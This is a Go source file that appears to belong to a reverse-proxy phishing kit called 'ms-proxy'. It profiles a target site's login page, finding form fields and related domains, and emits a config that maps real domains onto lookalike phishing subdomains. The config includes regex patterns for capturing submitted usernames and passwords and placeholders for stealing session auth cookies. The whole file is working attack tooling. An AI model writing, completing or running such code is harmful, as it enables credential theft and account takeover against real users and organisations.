package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"time"

	"golang.org/x/net/html"
)

// Profile is everything static recon can learn about a target.
type Profile struct {
	StartURL    string
	FinalURL    string // after redirects — the actual login page
	LoginPath   string
	LoginQuery  string
	domainSet   map[string]bool
	Domains     []string
	FormActions []string
	UserFields  []string
	PassFields  []string
}

func (p *Profile) addDomain(d string) {
	d = strings.ToLower(strings.TrimSpace(d))
	if d == "" || d == phishDomain || strings.HasSuffix(d, "."+phishDomain) {
		return
	}
	if p.domainSet == nil {
		p.domainSet = map[string]bool{}
	}
	if !p.domainSet[d] {
		p.domainSet[d] = true
		p.Domains = append(p.Domains, d)
	}
}

var commonLoginPaths = []string{
	"/", "/login", "/signin", "/sign-in", "/auth", "/login.srf",
	"/webmail", "/mail", "/owa", "/sso", "/saml", "/oauth2", "/account/login",
}

var browserUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
	"(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

// profileTarget finds the login page for a domain, follows redirects, parses the
// HTML, and extracts the domains / form fields / login URL for a Target config.
func profileTarget(domain string) (*Profile, error) {
	if !strings.HasPrefix(domain, "http://") && !strings.HasPrefix(domain, "https://") {
		domain = "https://" + domain
	}
	base, err := url.Parse(domain)
	if err != nil {
		return nil, fmt.Errorf("bad domain: %w", err)
	}

	client := &http.Client{Timeout: 20 * time.Second}

	// Try the given URL, then common login paths, until a page has a password field.
	candidates := []string{base.String()}
	for _, lp := range commonLoginPaths {
		candidates = append(candidates, base.Scheme+"://"+base.Host+lp)
	}

	var chosen, fallback *Profile
	for _, cand := range candidates {
		prof, err := fetchAndParse(client, cand)
		if err != nil {
			continue
		}
		prof.StartURL = base.String()
		prof.addDomain(base.Hostname())
		if len(prof.PassFields) > 0 {
			chosen = prof
			break
		}
		if fallback == nil {
			fallback = prof
		}
	}

	if chosen == nil {
		chosen = fallback
	}
	if chosen == nil {
		return nil, fmt.Errorf("could not fetch or parse any login page for %s", domain)
	}
	sort.Strings(chosen.Domains)
	return chosen, nil
}

func fetchAndParse(client *http.Client, rawURL string) (*Profile, error) {
	req, err := http.NewRequest("GET", rawURL, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", browserUA)
	req.Header.Set("Accept", "text/html,application/xhtml+xml")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	finalURL := resp.Request.URL
	p := &Profile{FinalURL: finalURL.String(), domainSet: map[string]bool{}}
	p.addDomain(finalURL.Hostname())
	p.LoginPath = finalURL.Path
	p.LoginQuery = finalURL.RawQuery

	body, err := io.ReadAll(io.LimitReader(resp.Body, 5_000_000))
	if err != nil {
		return nil, err
	}
	parseHTML(strings.NewReader(string(body)), finalURL, p)
	return p, nil
}

func parseHTML(body io.Reader, base *url.URL, p *Profile) {
	doc, err := html.Parse(body)
	if err != nil {
		return
	}
	var walk func(*html.Node)
	walk = func(n *html.Node) {
		if n.Type == html.ElementNode {
			for _, attr := range n.Attr {
				if attr.Key != "src" && attr.Key != "href" && attr.Key != "action" {
					continue
				}
				u, err := url.Parse(attr.Val)
				if err != nil {
					continue
				}
				resolved := base.ResolveReference(u)
				if resolved.Host != "" {
					p.addDomain(resolved.Hostname())
				}
				if attr.Key == "action" && n.Data == "form" {
					p.FormActions = append(p.FormActions, resolved.String())
				}
			}
			if n.Data == "input" {
				var name, typ string
				for _, attr := range n.Attr {
					switch attr.Key {
					case "name":
						name = attr.Val
					case "type":
						typ = strings.ToLower(attr.Val)
					}
				}
				if name != "" {
					switch typ {
					case "password":
						p.PassFields = append(p.PassFields, name)
					case "email", "text":
						p.UserFields = append(p.UserFields, name)
					}
				}
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			walk(c)
		}
	}
	walk(doc)
}

func (p *Profile) credPatterns() []string {
	seen := map[string]bool{}
	var fields []string
	for _, f := range append(append([]string{}, p.UserFields...), p.PassFields...) {
		f = strings.ToLower(f)
		if f != "" && !seen[f] {
			seen[f] = true
			fields = append(fields, f)
		}
	}
	var pats []string
	for _, f := range fields {
		q := regexp.QuoteMeta(f)
		pats = append(pats, fmt.Sprintf(`(?i)%s=([^&\s]+)`, q))
		pats = append(pats, fmt.Sprintf(`(?i)"%s"\s*:\s*"([^"]+)"`, q))
	}
	if len(pats) == 0 { // no fields found → generic fallback
		pats = append(pats,
			`(?i)login=([^&\s]+)`, `(?i)username=([^&\s]+)`,
			`(?i)password=([^&\s]+)`, `(?i)passwd=([^&\s]+)`,
		)
	}
	return pats
}

func (p *Profile) report() string {
	var b strings.Builder
	fmt.Fprintf(&b, "\n═══ TARGET PROFILE ═══\n")
	fmt.Fprintf(&b, "Start:      %s\n", p.StartURL)
	fmt.Fprintf(&b, "Login page: %s\n", p.FinalURL)
	fmt.Fprintf(&b, "Entry:      %s?%s\n", p.LoginPath, p.LoginQuery)
	fmt.Fprintf(&b, "User fields: %v\n", p.UserFields)
	fmt.Fprintf(&b, "Pass fields: %v\n", p.PassFields)
	fmt.Fprintf(&b, "Form actions: %v\n", p.FormActions)
	fmt.Fprintf(&b, "Domains (%d):\n", len(p.Domains))
	for _, d := range p.Domains {
		fmt.Fprintf(&b, "  - %s\n", d)
	}
	return b.String()
}

// generateConfig emits a static-only (draft) Target block for config.go.
func generateConfig(p *Profile, key string) string {
	entryHost := ""
	if u, err := url.Parse(p.FinalURL); err == nil {
		entryHost = u.Hostname()
	}

	phishFor := map[string]string{}
	phishFor[entryHost] = key + "." + phishDomain
	for _, d := range p.Domains {
		if _, ok := phishFor[d]; ok {
			continue
		}
		phishFor[d] = key + "-" + strings.ReplaceAll(d, ".", "-") + "." + phishDomain
	}

	var b strings.Builder
	fmt.Fprintf(&b, "\n\t// ── %s (auto-profiled from %s) ──\n", key, p.StartURL)
	fmt.Fprintf(&b, "\t%q: {\n", key)
	fmt.Fprintf(&b, "\t\tName:           %q,\n", key)
	fmt.Fprintf(&b, "\t\tEntrySubdomain: %q,\n", phishFor[entryHost])

	fmt.Fprintf(&b, "\t\tHostMap: map[string]string{\n")
	for _, d := range p.Domains {
		fmt.Fprintf(&b, "\t\t\t%q: %q,\n", phishFor[d], d)
	}
	fmt.Fprintf(&b, "\t\t},\n")

	fmt.Fprintf(&b, "\t\tReverseMap: map[string]string{\n")
	for _, d := range p.Domains {
		fmt.Fprintf(&b, "\t\t\t%q: %q,\n", d, phishFor[d])
	}
	fmt.Fprintf(&b, "\t\t},\n")

	fmt.Fprintf(&b, "\t\tModifyMimes: map[string]bool{\n")
	for _, m := range []string{"text/html", "application/json", "application/javascript",
		"application/x-javascript", "text/javascript", "text/plain"} {
		fmt.Fprintf(&b, "\t\t\t%q: true,\n", m)
	}
	fmt.Fprintf(&b, "\t\t},\n")

	fmt.Fprintf(&b, "\t\tCredPatterns: []*regexp.Regexp{\n")
	for _, pat := range p.credPatterns() {
		fmt.Fprintf(&b, "\t\t\tregexp.MustCompile(`%s`),\n", pat)
	}
	fmt.Fprintf(&b, "\t\t},\n")

	fmt.Fprintf(&b, "\t\tAuthTokenNames: map[string]bool{\n")
	fmt.Fprintf(&b, "\t\t\t// TODO: run one live login; add the cookies set on success\n")
	fmt.Fprintf(&b, "\t\t},\n")
	fmt.Fprintf(&b, "\t\t// TODO: ServiceUpstream: \"<post-login service domain>\" (final redirect target)\n")
	fmt.Fprintf(&b, "\t\tEntryPath:  %q,\n", p.LoginPath)
	fmt.Fprintf(&b, "\t\tEntryQuery: %q,\n", p.LoginQuery)
	fmt.Fprintf(&b, "\t},\n")
	return b.String()
}

// ══════════════════════════════════════════════════════════
//  CLI ENTRY POINT
//
//  ms-proxy -profile -domain <domain> [-key <k>] [-user <u> -pass <p>] [-headful]
//
//  Static recon always runs. Supplying -user/-pass adds the dynamic
//  (headless-login) phase, which fills AuthTokenNames + ServiceUpstream
//  automatically. Without them you get a static draft (with TODOs).
// ══════════════════════════════════════════════════════════

func runProfiler(args []string) {
	fs := flag.NewFlagSet("profile", flag.ExitOnError)
	domain := fs.String("domain", "", "domain to profile")
	key := fs.String("key", "newtarget", "target key")
	user := fs.String("user", "", "test username (enables dynamic profiling)")
	pass := fs.String("pass", "", "test password")
	headful := fs.Bool("headful", false, "show the browser window")
	fs.Parse(args)

	if *domain == "" {
		log.Fatal("usage: ms-proxy -profile -domain <domain> [-key <k>] [-user <u> -pass <p>] [-headful]")
	}

	// Phase 1 — static recon
	static, err := profileTarget(*domain)
	if err != nil {
		log.Fatalf("static profile failed: %v", err)
	}
	fmt.Println(static.report())

	// Phase 2 — dynamic (headless login), only if credentials were supplied
	var dyn *DynamicProfile
	if *user != "" && *pass != "" {
		fmt.Println("\n[*] Running dynamic profile (headless login)…")
		dyn, err = dynamicProfile(static.FinalURL, *user, *pass, static, !*headful)
		if err != nil {
			log.Printf("[!] dynamic profile failed: %v (using static only)", err)
		} else {
			fmt.Println(dyn.report())
		}
	}

	fmt.Println("\n// ── paste into the `targets` map in config.go ──")
	fmt.Println(generateConfigFull(static, dyn, *key))
}
